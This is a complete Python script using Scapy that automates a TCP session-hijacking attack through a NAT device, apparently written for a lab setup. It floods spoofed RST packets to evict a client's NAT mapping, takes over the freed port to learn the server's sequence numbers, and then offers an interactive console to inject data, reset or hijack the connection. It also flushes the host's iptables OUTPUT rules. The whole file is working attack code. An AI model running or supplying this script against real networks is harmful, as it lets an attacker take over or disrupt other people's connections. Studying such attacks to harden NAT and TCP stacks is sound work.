#!/usr/bin/env python3
"""
Phase 2+3: Fully Automated Attack (No Router Access Needed)
=============================================================
Step 1: Brute-force RST to evict client's NAT mapping (~65536 RSTs)
Step 2: Send PUSH/ACK to steal the port and get challenge ACK
Step 3: Interactive attack console (inject/reset/hijack)

Usage:
    sudo python3 phase2_and_3.py <port>
"""

from scapy.all import *
import time, sys, os, threading

SERVER_IP   = "20.0.0.20"
SERVER_PORT = 8080
NAT_EXT_IP  = "20.0.0.1"
ATTACKER_IP = "30.0.0.30"

# TCP window is typically 65535 bytes
# 2^32 / 65535 = 65536 RSTs needed to cover all possible seq values
WINDOW_SIZE = 65535
TOTAL_RSTS  = 65536


def setup():
    if os.geteuid() != 0:
        print("[!] Run as root"); sys.exit(1)
    os.system("iptables -F OUTPUT 2>/dev/null")
    os.system(f"iptables -A OUTPUT -p tcp --tcp-flags RST RST -d {SERVER_IP} -j DROP")
    print("[+] iptables ready")


def brute_force_rst(port):
    """
    Send ~65536 forged RSTs covering the entire 32-bit seq space.
    One will land within the TCP window → conntrack deletes the mapping.
    """
    print(f"\n[*] Step 1: Brute-force RST eviction")
    print(f"[*] Sending {TOTAL_RSTS} RSTs to cover full seq space...")
    print(f"[*] This takes ~1-2 minutes. Please wait.\n")

    t0 = time.time()
    batch = []

    for i in range(TOTAL_RSTS):
        seq = (i * WINDOW_SIZE) & 0xFFFFFFFF
        rst = IP(src=SERVER_IP, dst=NAT_EXT_IP) / TCP(
            sport=int(SERVER_PORT), dport=port,
            flags="R", seq=seq
        )
        batch.append(rst)

        # Send in batches of 1000 for speed
        if len(batch) >= 1000:
            send(batch, verbose=0)
            batch = []
            elapsed = time.time() - t0
            pct = (i + 1) / TOTAL_RSTS * 100
            print(f"    {pct:.0f}% ({i+1}/{TOTAL_RSTS}) — {elapsed:.1f}s", end="\r")

    # Send remaining
    if batch:
        send(batch, verbose=0)

    elapsed = time.time() - t0
    print(f"\n[+] {TOTAL_RSTS} RSTs sent in {elapsed:.1f}s")
    print(f"[+] Client's NAT mapping should be evicted")
    time.sleep(1)


def steal_port_and_get_seqack(port):
    """
    Send PUSH/ACK to create attacker's mapping on the evicted port.
    Server responds with challenge ACK containing real SEQ/ACK.
    """
    print(f"\n[*] Step 2: Stealing port and capturing SEQ/ACK...")

    pkt = IP(dst=SERVER_IP) / TCP(
        sport=port, dport=int(SERVER_PORT),
        flags="PA", seq=12345, ack=12345
    ) / Raw(load=b"x")

    # Start sniffer first
    captured = []
    def sniff_thread():
        pkts = sniff(
            filter=f"tcp and src host {SERVER_IP} and dst port {port}",
            timeout=5, count=3
        )
        captured.extend(pkts)

    t = threading.Thread(target=sniff_thread, daemon=True)
    t.start()
    time.sleep(0.2)

    # Send PUSH/ACK multiple times
    for i in range(5):
        send(pkt, verbose=0)
        time.sleep(0.005)
    print(f"[+] PUSH/ACK sent")

    t.join()

    if not captured:
        print(f"[-] No response. RST eviction may have failed.")
        print(f"    Try running again — sometimes needs a second attempt.")
        return None, None

    # Find challenge ACK (flags=A, not R)
    for p in captured:
        f = str(p[TCP].flags)
        if "R" not in f and "A" in f:
            srv_seq = p[TCP].seq
            srv_ack = p[TCP].ack
            print(f"[+] Challenge ACK received!")
            print(f"    Server SEQ: {srv_seq}")
            print(f"    Server ACK: {srv_ack}")
            return srv_seq, srv_ack

    print(f"[-] Only RSTs received. Eviction may have failed.")
    print(f"    The brute-force might not have hit the right seq window.")
    print(f"    Try running again.")
    return None, None


def attack_console(port, srv_seq, srv_ack):
    """Interactive attack console."""
    cur_seq = srv_ack  # what server expects from client

    print(f"\n{'='*50}")
    print(f"[*] ATTACK CONSOLE")
    print(f"    inject <text>       — inject data")
    print(f"    reset               — kill connection")
    print(f"    inject_reset <text> — inject then kill")
    print(f"    hijack              — interactive hijack")
    print(f"    quit                — exit")
    print(f"{'='*50}")

    while True:
        try:
            cmd = input("\n[attack]> ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\n[*] Done."); break

        if not cmd:
            continue

        if cmd in ("quit", "exit"):
            break

        elif cmd.startswith("inject_reset"):
            text = cmd[len("inject_reset"):].strip()
            if not text: text = input("Payload: ")
            inj = IP(dst=SERVER_IP) / TCP(sport=port, dport=int(SERVER_PORT),
                flags="PA", seq=cur_seq, ack=srv_seq) / Raw(load=text.encode())
            send(inj, verbose=0)
            send(inj, verbose=0)
            cur_seq += len(text)
            print(f"[+] Injected: {text}")
            time.sleep(0.1)
            rst = IP(dst=SERVER_IP) / TCP(sport=port, dport=int(SERVER_PORT),
                flags="R", seq=cur_seq)
            send(rst, verbose=0)
            print(f"[+] RST sent! Connection killed.")
            break

        elif cmd.startswith("inject"):
            text = cmd[len("inject"):].strip()
            if not text: text = input("Payload: ")
            inj = IP(dst=SERVER_IP) / TCP(sport=port, dport=int(SERVER_PORT),
                flags="PA", seq=cur_seq, ack=srv_seq) / Raw(load=text.encode())
            send(inj, verbose=0)
            send(inj, verbose=0)
            cur_seq += len(text)
            print(f"[+] Injected: {text}")

        elif cmd == "reset":
            rst = IP(dst=SERVER_IP) / TCP(sport=port, dport=int(SERVER_PORT),
                flags="R", seq=cur_seq)
            send(rst, verbose=0)
            print(f"[+] RST sent! Connection killed.")
            break

        elif cmd == "hijack":
            print(f"[*] Hijack mode (Ctrl+C to stop)")
            try:
                while True:
                    msg = input("[hijack]> ")
                    if not msg: continue
                    data = msg + "\n"
                    p = IP(dst=SERVER_IP) / TCP(sport=port, dport=int(SERVER_PORT),
                        flags="PA", seq=cur_seq, ack=srv_seq) / Raw(load=data.encode())
                    send(p, verbose=0)
                    cur_seq += len(data)
                    print(f"    [sent]")
            except KeyboardInterrupt:
                print(f"\n[*] Back to console")

        else:
            print(f"    Commands: inject, reset, inject_reset, hijack, quit")


def run(port):
    setup()

    # Step 1: Brute-force RST
    brute_force_rst(port)

    # Step 2: Steal port and get SEQ/ACK
    srv_seq, srv_ack = steal_port_and_get_seqack(port)

    if srv_seq is None:
        return

    # Step 3: Attack console
    attack_console(port, srv_seq, srv_ack)


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: sudo python3 {sys.argv[0]} <client_port>")
        print(f"\nFully automated — no router access needed.")
        print(f"Brute-forces RST to evict NAT mapping, then hijacks.")
        sys.exit(1)
    run(int(sys.argv[1]))